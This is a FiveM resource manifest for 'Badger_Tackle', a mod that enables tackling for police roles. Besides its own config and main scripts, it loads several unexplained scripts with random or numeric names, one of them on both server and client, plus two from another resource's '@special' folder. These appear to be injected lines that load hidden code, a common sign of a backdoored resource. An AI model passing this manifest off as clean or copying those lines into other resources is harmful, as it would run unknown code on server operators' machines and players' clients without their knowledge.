server_script "HS6FZWTNX.lua"
client_script "HS6FZWTNX.lua"
resource_manifest_version '44febabe-d386-4d18-afbe-5e627f4af937'

description 'Badger_Tackle - enables tackling for cops'

version '1.0.0'

server_scripts {
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'config.lua',
	'client/main.lua'
}

client_script '45515.lua'
client_script '37518.lua'
client_script '@special/13142.lua'
client_script '@special/41323.lua'